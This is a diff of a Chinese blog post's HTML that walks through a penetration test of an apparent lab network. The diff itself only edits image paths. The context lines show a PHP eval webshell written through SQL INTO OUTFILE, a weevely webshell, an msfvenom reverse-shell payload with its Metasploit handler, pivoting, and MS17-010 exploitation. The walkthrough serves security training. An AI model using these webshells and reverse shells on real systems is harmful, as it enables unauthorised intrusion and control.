@@ -134,7 +134,10 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -interface=eth0 --localnet</span><br></pre></td></tr></table></figure>
 
 <p>可以看到eth0局域网中的存活主机，这里可以看到内网中开放的web服务器主机为172.16.243.130</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210805201058838.png" alt="image-20210805201058838"></p>
+
+
+
+
 <p>下面对目标web服务器进行信息收集，比如端口，操作系统等信息</p>
 <p>使用nmap进行端口扫描和目标系统探测</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">namp -sV -A 172.16.243.130</span><br><span class="line">-sV   扫描目标主机运行软件的版本</span><br><span class="line">-A    扫描目标主机的操作系统和版本检测，脚本扫描和路由跟踪等</span><br></pre></td></tr></table></figure>
@@ -162,7 +165,14 @@
 <p>这里使用弱口令root  root登录了后台</p>
 <p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805210815913.png" alt="image-20210805210815913"></p>
 <p>可以看到目标服务器中的数据库列表如下，值得注意的是mysql数据库中的user数据表和newyxcms数据库(这个可能是旁站cms的数据库)</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806111233382.png" alt="image-20210806111233382"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806111233382.png" class title="image-20210806111233382">
+
+
+
+
+
+
+
 <p>进入后台我们想拿到服务器shell权限，由于在之前信息收集中知道了绝对路径，所以尝试使用sql语句写入一句话木马，然后使用工具连接，拿到服务器shell权限</p>
 <p>在SQL窗口执行写入一句话木马SQL语句</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_GET[&quot;cmd&quot;]);?&gt;&#x27; into outfile &#x27;C:/phpstudy/www/cmd.php&#x27;;</span><br></pre></td></tr></table></figure>
@@ -182,7 +192,10 @@
 <p>访问172.16.243.130/eval.php,可以看到写入eval.php成功</p>
 <p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805215930898.png" alt="image-20210805215930898"></p>
 <p>2.在之前对目标网站的目录进行扫描时，发现个压缩包叫做beifen.rar，下载后解压发现为yxcms文件夹，判断目标网站存在旁站，目标服务器部署了一个网站</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806111905032.png" alt="image-20210806111905032"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806111905032.png" class title="image-20210806111905032">
+
+
+
 <p>在网上搜索了一下，发现yxcms是一个企业化的建站系统,YXcms是一款基于PHP+MySql开发的网站管理系统，采用轻量级[MVC设计模式]。</p>
 <p>其默认的后台页面为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://域名或ip/yxcms/index.php?r=admin</span><br></pre></td></tr></table></figure>
@@ -190,32 +203,61 @@
 
 
 <p>构造url访问该网站页面:<a target="_blank" rel="noopener" href="http://172.16.243.130/yscms">http://172.16.243.130/yscms</a></p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113506787.png" alt="image-20210806113506787"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113506787.png" class title="image-20210806113506787">
+
+
+
 <p>浏览了一下主页面，出来有个cms后台登录页面看起来有点意思，其余的没什么好东西，于是点击登录，尝试弱口令登录后台</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113733048.png" alt="image-20210806113733048"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113733048.png" class title="image-20210806113733048">
+
+
+
 <p>结果显示登录失败</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113851326.png" alt="image-20210806113851326"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113851326.png" class title="image-20210806113851326">
+
+
+
 <p>我看了看url中的r参数为member，是否通过r参数来判断一般用户和管理员登录权限，于是将r修改成admin尝试访问</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.243.130/yxcms/index.php?r=admin</span><br></pre></td></tr></table></figure>
 
 <p>可以看到yxcms的管理后台，尝试使用弱口令admin 123456进行登录</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806114049007.png" alt="image-20210806114049007"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806114049007.png" class title="image-20210806114049007">
+
+
+
 <p>成功登录后台页面，可以看到很多服务器相关信息和yxcms网站相关设置和功能</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806115148987.png" alt="image-20210806115148987"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806115148987.png" class title="image-20210806115148987">
+
+
+
 <p>在全局设置中的前台模板中，我们可以修改模板文件，我们可以将木马代码插入其中并进行加载</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806141921572.png" alt="image-20210806141921572"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806141921572.png" class title="image-20210806141921572">
+
+
+
+
+
 <p>通过上述的一些方法将一句话木马上传到目标web服务器中，然后使用webshell工具去连接目标路径的木马，拿到web服务器的shell和权限</p>
 <p>使用weevely生成木马文件test.php,并将其上传到目标web服务器上</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate password(密码)  test.php(生成文件名)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806144420340.png" alt="image-20210806144420340"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806144420340.png" class title="image-20210806144420340">
+
+
+
 <p>然后去连接服务器上的test.php文件，连接建立会话成功</p>
 <p>weevely  <a target="_blank" rel="noopener" href="http://172.16.243.130/test.php(%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84)">http://172.16.243.130/test.php(文件路径)</a>  password(密码)</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806144559145.png" alt="image-20210806144559145"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806144559145.png" class title="image-20210806144559145">
+
+
+
 <p>接下来我们在攻击主机上利用msfvenom生成反弹shell的木马qq.exe</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.243.128 lport=12345 -f exe &gt; qq.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806151838583.png" alt="image-20210806151838583"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806151838583.png" class title="image-20210806151838583">
+
+
+
 <p>然后我们将qq.exe通过weevely上传到目标服务器目录中</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_upload /opt/tools/web/auto/metasploit/qq.exe qq.exe</span><br></pre></td></tr></table></figure>
 
@@ -229,9 +271,15 @@
 <p>接着打开msfconsole，开启监听模块设置参数反弹shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole         ###打开metasploit</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler   ###设置监听模块</span><br><span class="line"></span><br><span class="line">set lhost 172.16.243.1      ##设置监听主机ip地址</span><br><span class="line"> </span><br><span class="line">set lport 12345              ###设置监听主机端口</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806153849245.png" alt="image-20210806153849245"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806153849245.png" class title="image-20210806153849245">
+
+
+
 <p>可以看到反弹shell成功，通道建立成功</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806200708273.png" alt="image-20210806200708273"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806200708273.png" class title="image-20210806200708273">
+
+
+
 <h3 id="目标主机信息收集"><a href="#目标主机信息收集" class="headerlink" title="目标主机信息收集"></a>目标主机信息收集</h3><p>后渗透阶段先不急着立马提权或者进行横向渗透，先对目标主机以及所在环境进行全方位的信息收集</p>
 <p>主机信息收集的常用cmd命令:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">systeminfo                  #查看详细的系统信息</span><br><span class="line">whoami                      #查看当前使用用户</span><br><span class="line">hostname                    #主机名称</span><br><span class="line">net user                    #查看主机上的用户</span><br><span class="line">net localgroup administrators     #查看系统管理员组中的用户列表</span><br><span class="line">ipconfig /all              #查看主机网络配置情况</span><br><span class="line">net share                  #查看本地开启的共享的文件夹</span><br><span class="line">netstat -ano | findstr &quot;端口号&quot;   #查看指定端口的开放情况</span><br><span class="line">wmic product  get name,version   #查询已安装的软件名称及版本情况</span><br><span class="line">cmdkey  /list              #查看3389远程端口可信任链接</span><br><span class="line">FOR /f &quot;skip=1 token=1,2 delims= &quot; %c in (&#x27;wmic useraccount get name^,sid&#x27;) do dir /a /b C:\$Recycle.Bin\%d\ ^&gt;%c.txt  #windows回收站的信息获取</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -239,19 +287,36 @@
 
 
 <p>使用systeminfo查看目标主机的系统信息</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806203335970.png" alt="image-20210806203335970"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806203335970.png" class title="image-20210806203335970">
+
+
+
 <p>可以看到主机的安装的修补程序，这也是需要着重观察的信息，我们可以通过该修补程序中没有的补丁来查看主机漏洞进行攻击</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806203504328.png" alt="image-20210806203504328"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806203504328.png" class title="image-20210806203504328">
+
+
+
 <p>可以看到拿到目标主机的权限是管理员权限</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806204341557.png" alt="image-20210806204341557"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806204341557.png" class title="image-20210806204341557">
+
+
+
 <h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>常用的域信息收集命令:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net view /domain          #查看域</span><br><span class="line">net group /domain         #查询组</span><br><span class="line">net user  /domain         #查询域用户</span><br><span class="line">net group  &quot;domain admin&quot;  /domain     #查询域管理员信息</span><br><span class="line">net group  &quot;domain computers&quot;  /domain   #查询域内机器信息</span><br><span class="line">net config workstation        #查看当前计算机名，全名，用户名等信息</span><br><span class="line">net time  /domain             #查询主域服务器的时间</span><br></pre></td></tr></table></figure>
 
 <p>上述的命令会发送到域控中查询信息，如果渗透的机器不是与用户则不是域用户权限，但是存在域</p>
 <p>下面为当前计算机的相关信息，可以看到指定的域dns名称为god.org</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806211120373.png" alt="image-20210806211120373"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806211120373.png" class title="image-20210806211120373">
+
+
+
+
+
 <p>一般来说，域主机的DNS服务器指定的是域控的ip地址，我们可以使用nslookup来观察dns服务器ip地址和解析god.org的A记录ip地址。可以看到ip地址都为192.168.52.138,则可以判断域控为它</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806211603738.png" alt="image-20210806211603738"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806211603738.png" class title="image-20210806211603738">
+
+
+
 <h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><p>这里由于反弹shell后连接的目标主机权限为管理员权限，也就省去了提权的操作。收集完目标主机的相关信息后，下面就是对处于内网的主机进行横向渗透，先对域内的主机进行渗透，然后在对域控进行渗透</p>
 <h4 id="路由-端口转发"><a href="#路由-端口转发" class="headerlink" title="路由/端口转发"></a>路由/端口转发</h4><p>要想在处于外网的攻击主机连接处于内网域中的主机，肯定是不能直接连接的，要通过受控主机进行端口转发或者路由转发，使受控主机充当个路由转发使外网的主机能连接处于内网的主机</p>
 <p><strong>1.直接利用msf添加到内网网段的路由</strong></p>
@@ -259,13 +324,19 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets            #查看本机的路由</span><br><span class="line">run autoroute  -s  192.168.52.0/24  #添加目标内网网段到路由信息中</span><br><span class="line">run autoroute  -p               #查看当前的路由设置</span><br></pre></td></tr></table></figure>
 
 <p>可以看到当前的路由设置为到内网网段，现在就可以通过msf访问内网主机</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806212949813.png" alt="image-20210806212949813"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806212949813.png" class title="image-20210806212949813">
+
+
+
 <p><strong>2.将内网穿透工具上传到web服务器上，然后在攻击机上进行连接指定端口</strong></p>
 <p>这里使用venom工具进行内网穿透，将agent.exe使用upload命令上传到目标web服务器上，然后在攻击机上运行admin客户端程序</p>
 <p>这里使用反向代理，客户端监听4444端口，让服务端来连接客户端(admin和agent都可以进行监听和连接)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 4444</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808182501466.png" alt="image-20210808182501466"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808182501466.png" class title="image-20210808182501466">
+
+
+
 <p>在目标主机上运行agent.exe指定admin的ip地址和端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -rhost 172.16.243.1  -rport 4444</span><br></pre></td></tr></table></figure>
 
@@ -281,11 +352,19 @@
 
 
 <p>可以看到该台域内主机的端口开放如下:</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808214717299.png" alt="image-20210808214717299"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808214717299.png" class title="image-20210808214717299">
+
+
+
 <p>对域控主机182.168.52.138进行端口扫描</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auiliary/scanner/portscan</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810112439456.png" alt="image-20210810112439456"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810112439456.png" class title="image-20210810112439456">
+
+
+
+
+
 <h4 id="域内主机渗透"><a href="#域内主机渗透" class="headerlink" title="域内主机渗透"></a>域内主机渗透</h4><h4 id="漏洞检测利用"><a href="#漏洞检测利用" class="headerlink" title="漏洞检测利用"></a>漏洞检测利用</h4><p>目标端口的139和445端口开放，联想到ms17-010这个漏洞，尝试去验证这个漏洞是否存在</p>
 <p>首先使用nmap自带的脚本进行漏洞Fuzz：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln  192.168.52.141</span><br></pre></td></tr></table></figure>
@@ -294,17 +373,26 @@
 <p>尝试使用/scanner/smb/ms17_010_commmand模块对目标进行扫描,发现目标可能存在ms17_010</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use  auxiliary/scanner/smb/smb_ms17has</span><br><span class="line">set rhosts 192.168.52.141</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808220259617.png" alt="image-20210808220259617"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808220259617.png" class title="image-20210808220259617">
+
+
+
 <p>下面使用admin/smb/ms17_010_command模块对该主机的ms17_010判断是否为可以利用和执行的权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use  admin/smb/ms17_010_command</span><br></pre></td></tr></table></figure>
 
 <p>可以看到目标主机执行的权限为Administrator管理员权限</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808221620326.png" alt="image-20210808221620326"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808221620326.png" class title="image-20210808221620326">
+
+
+
 <p>接下来就是对目标主机的ms17-010进行漏洞利用拿到目标shell</p>
 <p>我首先使用的是exploit/windows/smb/ms17_010_eternablue模块的windows/x64/meterpreter/reverse_tcp的payload，但是管道并没有创建成功，由于目标内网不能连接攻击主机</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_enternablue</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104223573.png" alt="image-20210809104223573"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104223573.png" class title="image-20210809104223573">
+
+
+
 <p>接着使用了windows/smb/ms17_010_pspexec模块的windows/shell/bind_tcp的payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"></span><br><span class="line">set payload windows/shell/bind_tcp</span><br></pre></td></tr></table></figure>
 
@@ -312,16 +400,23 @@
 
 <p>这个payload可以让目标主机开通个tcp监视器，然后让攻击主机去连接目标主机端口就可以执行shell</p>
 <p>攻击成功，进入win2003的shell</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104415099.png" alt="image-20210809104415099"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104415099.png" class title="image-20210809104415099">
+
+
+
 <p>获取目标主机权限后，首先查看权限级别是否为管理员权限，然后考虑提权的问题</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>
 
 <p>可以看到此时执行的权限为system，系统管理员权限</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104902785.png" alt="image-20210809104902785"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104902785.png" class title="image-20210809104902785">
+
+
+
 <p>查看目标主机的系统相关信息，特别是补丁等信息</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
 
